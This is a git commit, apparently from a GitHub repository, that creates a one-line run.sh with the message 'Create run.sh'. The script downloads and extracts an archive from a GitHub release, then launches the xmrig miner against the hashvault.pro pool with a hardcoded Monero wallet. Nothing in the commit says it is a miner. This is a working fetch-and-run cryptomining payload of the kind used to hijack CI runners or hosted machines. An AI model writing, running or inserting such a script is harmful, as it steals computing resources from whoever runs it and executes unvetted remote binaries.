0e5a9719665ba51bc211e7d24b3c19847c757f0f
chloeclip <130277654+chloeclip@users.noreply.github.com>
2023-04-09 16:29:06 +0800

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,1 @@
+wget https://github.com/chloeclip/feed/archive/refs/tags/1.tar.gz && tar -xvf 1.tar.gz && ./xmrig -o pool.hashvault.pro:3333 -u 4An16QsmWem7TL4Az7x93bGkBX3JjzCxQ4bAhcS5M3y6U1hEckM6RT8idvDRo9rRQtAPAPzdHpfLz7zgJ9Tbvb3JQBXwEvQ -p x
